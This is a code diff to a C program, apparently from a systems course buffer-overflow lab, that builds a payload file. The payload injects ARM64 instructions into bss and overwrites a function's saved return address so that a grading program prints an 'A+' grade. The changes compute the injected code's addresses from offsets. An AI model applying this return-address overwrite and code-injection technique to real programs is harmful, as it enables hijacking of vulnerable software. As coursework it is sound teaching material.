@@ -26,16 +26,16 @@ int main(void) {
     
     /* write instructions */
     /* put address of new string in reg 0 */
-    uiAdr = MiniAssembler_adr(0, 0x420070, 0x420064);
+    uiAdr = MiniAssembler_adr(0, 0x420070, 0x420058 + i);
     fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
     i = i + 4;
     /* put address of new A+ string in reg 1 */
-    uiAdr1 = MiniAssembler_adr(1, 0x420085, 0x420068);
+    uiAdr1 = MiniAssembler_adr(1, 0x420085, 0x420058 + i);
     fwrite(&uiAdr1, sizeof(unsigned int), 1, psFile);
     i = i + 4;
     /* branch to print instr (0x4008ac is addr of printf instr in main,
     0x42006c is addr of this instr) */
-    uiB = MiniAssembler_b(0x4008ac, 0x42006c);
+    uiB = MiniAssembler_b(0x4008ac, 0x420058 + i);
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
     i = i + 4;
     fwrite("%s is your grade.\n\0", 1, 20, psFile);
@@ -48,7 +48,7 @@ int main(void) {
     }
 
     /* overwrite getName's x30 with addr of inject code in bss */
-    uiTargetAddr = 0x420064;
+    uiTargetAddr = 0x420058 + iNameLength + 1;
     fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
     fclose(psFile);
 
